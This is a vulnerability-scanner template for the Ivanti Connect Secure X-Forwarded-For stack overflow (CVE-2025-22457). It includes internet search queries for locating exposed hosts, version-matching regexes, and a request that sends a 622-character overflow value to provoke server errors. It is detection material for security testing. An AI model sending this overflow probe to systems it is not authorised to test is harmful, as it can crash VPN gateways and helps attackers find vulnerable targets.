id: CVE-2025-22457

info:
  name: Ivanti Connect Secure - Stack-Based Buffer Overflow (RCE)
  author: vishwamartur
  severity: critical
  description: |
    Ivanti Connect Secure < 22.7R2.6, Ivanti Policy Secure < 22.7R1.4, and Ivanti ZTA Gateways < 22.8R2.2 contain a stack-based buffer overflow caused by improper input handling in the X-Forwarded-For header processing. This vulnerability allows remote attackers to execute arbitrary code without authentication, requiring only network access to the target system.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/ivanti_connect_secure_stack_overflow_rce_cve_2025_22457.rb
    - https://github.com/B1ack4sh/Blackash-CVE-2025-22457
    - https://vulncheck.com/xdb/79aa4a3559fa
    - https://nvd.nist.gov/vuln/detail/CVE-2025-22457
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-22457
    cwe-id: CWE-787
    epss-score: 0.95000
    epss-percentile: 0.99900
    cpe: cpe:2.3:a:ivanti:connect_secure:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: ivanti
    product: connect_secure
    shodan-query: 
      - title:"Ivanti Connect Secure"
      - http.title:"ivanti connect secure"
      - http.html:"welcome.cgi?p=logo"
    fofa-query:
      - title="ivanti connect secure"
      - body="welcome.cgi?p=logo"
    google-query: intitle:"ivanti connect secure"
  tags: cve,cve2025,ivanti,connect-secure,rce,buffer-overflow,kev,critical

variables:
  test_payload: "{{repeat('1', 622)}}"

http:
  - raw:
      - |
        GET /dana-na/auth/url_admin/welcome.cgi?type=inter HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12-188-gaebfabb3-dirty
        Content-Type: EAP
        Upgrade: IF-T/TLS 1.0
        Content-Length: 0

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: {{test_payload}}

    matchers-condition: and
    matchers:
      - type: dsl
        name: ivanti_detection
        dsl:
          - 'status_code_1 == 200'
          - 'contains(body_1, "productversion") || contains(body_1, "Ivanti Connect Secure") || contains(body_1, "welcome.cgi")'
        condition: and

      - type: dsl
        name: version_vulnerable
        dsl:
          - 'regex("name=\"productversion\"\\s+value=\"22\\.7\\.[0-2]\\.[0-9]+", body_1) && !regex("name=\"productversion\"\\s+value=\"22\\.7\\.2\\.[6-9][0-9]*", body_1)'
          - 'regex("name=\"productversion\"\\s+value=\"22\\.7\\.[01]\\.[0-9]+", body_1) && !regex("name=\"productversion\"\\s+value=\"22\\.7\\.1\\.[4-9][0-9]*", body_1)'
          - 'regex("name=\"productversion\"\\s+value=\"22\\.8\\.[01]\\.[0-9]+", body_1)'
          - 'regex("name=\"productversion\"\\s+value=\"22\\.8\\.2\\.[01]", body_1)'
          - 'regex("name=\"productversion\"\\s+value=\"9\\.[01]\\.[0-9]+\\.[0-9]+", body_1)'
        condition: or

      - type: dsl
        name: protocol_switch
        dsl:
          - 'status_code_2 == 101'
          - 'contains(header_2, "101 Switching Protocols")'
        condition: and

      - type: dsl
        name: buffer_overflow_response
        dsl:
          - 'status_code_3 == 500 || status_code_3 == 502 || status_code_3 == 0 || status_code_3 == 400'
          - 'len(body_3) == 0 || contains(body_3, "Internal Server Error") || contains(body_3, "Bad Gateway") || contains(body_3, "Bad Request")'
        condition: or

    extractors:
      - type: regex
        name: product_version
        part: body_1
        group: 1
        regex:
          - 'name="productversion"\\s+value="([^"]+)"'

      - type: regex
        name: vulnerable_version
        part: body_1
        group: 1
        regex:
          - 'name="productversion"\\s+value="(22\\.7\\.[0-2]\\.[0-9]+)"'
          - 'name="productversion"\\s+value="(22\\.8\\.[01]\\.[0-9]+)"'
          - 'name="productversion"\\s+value="(22\\.8\\.2\\.[01])"'
          - 'name="productversion"\\s+value="(9\\.[01]\\.[0-9]+\\.[0-9]+)"'

      - type: kval
        name: response_headers
        part: header_3
        kval:
          - "Server"
          - "Connection"

# digest: 4a0a00473045022100c73a034a59fffa158618dce447e803328530be6818d88ca900b735335a749443022100dd0dcee512f029936e413a1390c5fcf9ad2b59f7953a656995893620c5e290ee:922c64590222798bb761d5b6d8e72950
